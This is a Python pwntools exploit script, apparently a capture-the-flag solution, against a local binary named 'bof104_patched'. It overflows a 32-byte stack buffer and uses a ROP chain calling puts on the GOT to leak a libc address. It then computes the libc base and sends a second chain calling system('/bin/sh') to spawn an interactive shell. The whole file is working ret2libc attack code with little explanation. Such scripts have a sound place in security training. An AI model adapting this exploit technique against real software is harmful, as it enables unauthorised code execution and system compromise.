from pwn import *

binary = "./bof104_patched"
libc = ELF("./libc.so.6")

elf = context.binary = ELF(binary)

p = process(binary)

bofme = p64(0x004011ac)
ret = p64(0x000000000040101a)
rdi = p64(0x0000000000401263) #0x0000000000401263 : pop rdi ; ret


# puts_got = p64(elf.sym["got.puts"]) #using puts GOT
# puts_plt = p64(elf.sym["plt.puts"]) #using puts PLT

# print("got : " + hex(u64(puts_got.ljust(8,b'\x00'))))
# print("plt : " + hex(u64(puts_plt.ljust(8,b'\x00'))))
# payload = b"A"*32+b"B"*8
# #payload += ret
# payload += rdi
# payload += puts_got
# payload += puts_plt
# payload += p64(elf.sym["bofme"])

# p.sendline(payload)
# p.recvline()[:-1]

rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.bofme()
p.sendline(b"A" * 0x20 + b"BBBBBBBB" + rop.chain())
p.recvline()


#### GET LEAK
puts_leak = u64(p.recvline()[:-1].strip().ljust(8,b'\x00'))
libc_address = puts_leak - libc.symbols['puts']
libc.address = libc_address
bin_sh = p64(next(libc.search(b"/bin/sh\x00")))
#system = p64(libc.symbols.system)


# print("======Addresses=====")
print("PUTS LEAK: " + hex(puts_leak))
print("PUTS SYM: " + hex(libc.symbols['puts']))
print("LIBC ADDR : " + hex(libc_address))
print("BIN SH ADDR : " + hex(u64(bin_sh.ljust(8,b'\0'))))
#print("SYSTEM ADDR : " + hex(u64(system.ljust(8,b'\0'))))

#pause()
## Sending attack payload

# payload = b"B"*40
# #payload += ret
# payload += rdi
# payload += bin_sh
# payload += system

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(bin_sh)

p.sendline(b"A" * 0x20 + b"BBBBBBBB" + rop.chain())

#p.sendline(payload)
#p.recv()
p.interactive()